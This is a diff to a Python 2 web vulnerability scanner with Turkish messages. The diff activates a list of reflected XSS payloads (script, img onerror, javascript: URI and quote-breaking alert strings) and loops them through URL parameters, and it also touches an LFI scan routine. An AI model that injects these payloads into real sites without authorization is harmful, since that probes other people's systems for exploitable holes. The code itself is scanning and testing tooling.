@@ -803,10 +803,12 @@ def xsstest(xsstesturl):
 
     try:
 	print "XSS Test ediliyor ... "
-	urlac = urllib2.urlopen(xsstesturl+"bekirburadaydi11111")
+	urlac = urllib2.urlopen(xsstesturl+"0x000123")
 	response = urlac.read()
-	if "bekirburadaydi11111" in response:
-	    #yaz("XSS Test BULUNDU : " + xsstesturl+"bekirburadaydi11111",True)
+	if "0x000123" in response:
+	    yaz("XSS Test BULUNDU : " + xsstesturl+" 0x000123",True)
+	    xsstara(xsstesturl)
+	else:
 	    xsstara(xsstesturl)
 		  
     except urllib2.HTTPError,e:
@@ -822,26 +824,32 @@ def xsstest(xsstesturl):
 
 def xsstara(xssurl):
     
-    #xsspayload=["\"><script>alert(0x98101107105114981171149710097)</script>",
-                #"\"><sCriPt>alert(0x98101107105114981171149710097)</sCriPt>",
-                #"\"; alert(document.0x98101107105114981171149710097);",
-                #"\"></sCriPt><sCriPt >alert(0x98101107105114981171149710097)</sCriPt>",
-                #"\"><img Src=0x94 onerror=alert(0x98101107105114981171149710097)>",
-                #"\"><BODY ONLOAD=alert(0x98101107105114981171149710097)>",
-                #"\"><IMG SRC=\"javascript:alert(0x98101107105114981171149710097);\">",
-                #"\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x98101107105114981171149710097);\">"]
+    xsspayload=["\"><script>alert(0x000123)</script>",
+                "\"><sCriPt>alert(0x000123)</sCriPt>",
+                "\"; alert(0x000123)",
+                "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
+                "\"><img Src=0x94 onerror=alert(0x000123)>",
+                "\"><BODY ONLOAD=alert(0x000123)>",
+                "\"><IMG SRC=\"javascript:alert(0x000123);\">",
+                "\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x000123);\">",
+                "'%2Balert(0x000123)%2B'",
+                "\"><0x000123>",
+                "'+alert(0x000123)+'",
+                "%2Balert(0x000123)%2B'",
+                "';alert(0x000123)'"]
     
     try:
-	print "XSS Taraniyor ... "
-	urlnormal=xssurl.replace("=", "=\"><0x98101107105114981171149710097>")
-	urlac = urllib2.urlopen(urlnormal)
-	response = urlac.read()
-	if "\"><0x98101107105114981171149710097>" in response:
-	    xssmi=xsscalisiomu(response)
-	    if xssmi==False:
-		yaz("[#] XSS BULUNDU ve Satirda Noscript Yok: " + urlnormal,True)
-	    else:
-		yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
+	for xssler in xsspayload:
+	    print "XSS Taraniyor ... "
+	    urlnormal=xssurl.replace("=", "="+xssler)
+	    urlac = urllib2.urlopen(urlnormal)
+	    response = urlac.read()
+	    if "alert(0x000123)" in response or "alert%280x000123%29" in response:
+		xssmi=xsscalisiomu(response)
+		if xssmi==False:
+		    yaz("[#] XSS BULUNDU : " + urlnormal,True)
+		else:
+		    yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
 		   
     except urllib2.HTTPError,  e:
 	if(e.code==500):
@@ -934,7 +942,6 @@ def lfitara(lfibul):
 		lfilihal={}
 		lfilihal[key]=lfidizin
 		lfiparametre = urllib.urlencode(lfilihal)
-		print lfiparametre
 		print "LFi Taraniyor ... "
 		#urlnormal=lfiurl.replace("=", "="+lfidizin)
 		urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
@@ -1118,10 +1125,12 @@ def headerbilgi(host):
 	
 def xsscalisiomu(kaynak):
     
+    xssdurum=False
+    
     bakalim=set(list(kaynak.split("\n")))
     
     for satir in bakalim:
-	if "\"><0x98101107105114981171149710097>" in satir:
+	if "\"><0x000123>" in satir:
 	    if "<code>" in satir or "<noscript>" in satir:
 		xssdurum=True
 	    else:
@@ -1222,7 +1231,7 @@ def linkler(urltara,host):
 	print "Saglikli tarama icin sitedeki tum linkleri cekiyor lutfen bekleyiniz..."
 	while not queue.empty():
 	    qudekiveri=queue.get()
-	    dahildegil = ("xlsx","html","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
+	    dahildegil = ("xlsx","htmldd","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
 	    
 	    linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
 	    linkopener.addheaders = [
